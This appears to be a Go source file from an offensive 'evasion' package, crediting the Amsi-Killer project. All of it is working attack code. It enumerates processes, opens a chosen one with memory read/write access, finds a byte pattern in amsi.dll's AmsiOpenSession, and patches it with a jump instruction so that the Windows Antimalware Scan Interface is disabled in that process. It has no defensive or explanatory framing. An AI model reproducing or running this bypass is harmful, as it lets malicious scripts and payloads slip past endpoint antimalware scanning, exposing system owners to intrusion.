package evasion

// cool technique by https://github.com/ZeroMemoryEx/Amsi-Killer

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var pattern = []byte{0x48, '?', '?', 0x74, '?', 0x48, '?', '?', 0x74}
var patch = []byte{0xEB}
var onemessage = true

func AMSIByPass(pn string) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		fmt.Println("[!] Error creating snapshot:", err)
		return
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snapshot, &entry)
	if err != nil {
		fmt.Println("[!] Error getting first process:", err)
		return
	}

	for {
		exeFile := windows.UTF16ToString(entry.ExeFile[:])
		if exeFile == pn {
			if amigo(entry.ProcessID) {
				fmt.Printf("[+] AMSI patched %d\n", entry.ProcessID)
			} else {
				fmt.Println("[!] Patch failed")
			}
		}
		err = windows.Process32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}
}

func amigo(pid uint32) bool {
	const PROCESS_VM_OPERATION = 0x0008
	const PROCESS_VM_READ = 0x0010
	const PROCESS_VM_WRITE = 0x0020

	if pid == 0 {
		return false
	}

	handle, err := windows.OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE, false, pid)
	if err != nil {
		fmt.Println("[!] Error opening process:", err)
		return false
	}
	defer windows.CloseHandle(handle)

	hModule, err := windows.LoadLibrary("amsi.dll")
	if err != nil {
		fmt.Println("[!] Error loading library:", err)
		return false
	}
	defer windows.FreeLibrary(hModule)

	amsiAddr, err := windows.GetProcAddress(hModule, "AmsiOpenSession")
	if err != nil {
		fmt.Println("[!] Error getting procedure address:", err)
		return false
	}

	buffer := make([]byte, 1024)
	var bytesRead uintptr
	err = windows.ReadProcessMemory(handle, amsiAddr, &buffer[0], 1024, &bytesRead)
	if err != nil {
		fmt.Println("[!] Error reading process memory:", err)
		return false
	}

	matchAddress := searchPattern(buffer, pattern)
	if matchAddress == -1 {
		return false
	}

	if onemessage {
		fmt.Printf("[+] AMSI address %p\n", amsiAddr)
		fmt.Printf("[+] Offset: %d\n", matchAddress)
		onemessage = false
	}

	updateAmsiAddr := uintptr(amsiAddr) + uintptr(matchAddress)
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(handle, updateAmsiAddr, &patch[0], 1, &bytesWritten)
	if err != nil {
		fmt.Println("[!] Error writing process memory:", err)
		return false
	}

	return true
}

func searchPattern(buffer []byte, pattern []byte) int {
	for i := 0; i < len(buffer)-len(pattern); i++ {
		matched := true
		for j := 0; j < len(pattern); j++ {
			if pattern[j] != '?' && buffer[i+j] != pattern[j] {
				matched = false
				break
			}
		}
		if matched {
			return i + 3
		}
	}
	return -1
}
